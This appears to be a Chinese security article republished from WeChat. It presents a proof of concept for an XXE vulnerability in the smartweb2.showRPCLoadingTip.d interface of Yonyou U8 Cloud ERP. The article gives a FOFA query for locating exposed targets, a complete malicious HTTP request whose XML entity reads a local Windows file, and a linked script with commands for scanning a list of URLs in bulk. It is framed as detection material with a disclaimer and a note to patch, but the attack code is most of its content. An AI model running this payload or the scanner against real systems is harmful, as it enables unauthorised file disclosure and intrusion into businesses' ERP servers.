<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/NbCK-Gxy3IZnh5Rfg1UkiQ)

**免责声明：本文仅用于技术学习和讨论。请勿使用本文所提供的内容及相关技术从事非法活动，若利用本文提供的内容或工具造成任何直接或间接的后果及损失，均由使用者本人负责，所产生的一切不良后果均与文章作者及本账号无关。**

**fofa**

```
app="用友-U8-Cloud"

```

**一、漏洞简述**

用友 U8 cloud 是用友推出的新一代云 ERP，主要聚焦成长型、创新型企业，提供企业级云 ERP 整体解决方案，全面支持多组织业务协同、营销创新、智能财务、人力服务，构建产业链制造平台，融合用友云服务，实现企业互联网资源连接、共享、协同，赋能中国成长型企业高速发展、云化创新。其接口 smartweb2.showRPCLoadingTip.d 存在 XXE 漏洞，攻击者可通过该漏洞获取系统敏感信息或探测内网信息，甚至造成远程命令执行。

****二、漏洞检测 poc****

```
POST /hrss/dorado/smartweb2.showRPCLoadingTip.d?skin=default&__rpc=true&windows=1 HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Connection: close
Content-Length: 631
__type=updateData&__viewInstanceId=nc.bs.hrss.rm.ResetPassword~nc.bs.hrss.rm.ResetPasswordViewModel&__xml=%3C%21DOCTYPE+z+%5B%3C%21ENTITY+test++SYSTEM+%22file%3A%2F%2F%2Fc%3A%2Fwindows%2Fwin.ini%22+%3E%5D%3E%3Crpc+transaction%3D%221%22+method%3D%22resetPwd%22%3E%3Cdef%3E%3Cdataset+type%3D%22Custom%22+id%3D%22dsResetPwd%22%3E%3Cf+name%3D%22user%22%3E%3C%2Ff%3E%3C%2Fdataset%3E%3C%2Fdef%3E%3Cdata%3E%3Crs+dataset%3D%22dsResetPwd%22%3E%3Cr+id%3D%221%22+state%3D%22insert%22%3E%3Cn%3E%3Cv%3E1%3C%2Fv%3E%3C%2Fn%3E%3C%2Fr%3E%3C%2Frs%3E%3C%2Fdata%3E%3Cvps%3E%3Cp+name%3D%22__profileKeys%22%3E%26test%3B%3C%2Fp%3E%3C%2Fvps%3E%3C%2Frpc%3E

```

![图片](https://mmbiz.qpic.cn/mmbiz_png/5h6SVtXyicgzpxbibsiaz9ian2t9HehYDd3Qm7dkjstmxrjGK9d7MUArRbcSQtp6mZg2lSSJmQjCgSy77icPsFh7EEA/640?wx_fmt=png&from=appmsg)

****三、漏洞检测脚本****

****安全测试人员可通过该脚本进行探测自身服务是否存在此漏洞：****

https://github.com/ATonysan/poc-exp/blob/main/YongYouU8C_smartweb2showRPCLoadingTipd_XXE.py

批量检测:

python YongYouU8C_smartweb2showRPCLoadingTipd_XXE.py -f url.txt

![图片](https://mmbiz.qpic.cn/mmbiz_png/5h6SVtXyicgzpxbibsiaz9ian2t9HehYDd3QLxAnzz174g5OkvaqdwzUibPtNMibZLn7oPR7RGwMQP7EQWkgKLVLvia7w/640?wx_fmt=png&from=appmsg)

单个 url 检测漏洞:

python YongYouU8C_smartweb2showRPCLoadingTipd_XXE.py -u url

![图片](https://mmbiz.qpic.cn/mmbiz_png/5h6SVtXyicgzpxbibsiaz9ian2t9HehYDd3QggQdqib8q8GV1TdRhI6PVcdUyOb3Gdp8rHlJ88psJNPkNyF74iayicQAw/640?wx_fmt=png&from=appmsg)

**四、修复**

官方已更新补丁，请升级至最新版本。

官网地址：http://www.ufida-lcwy.com/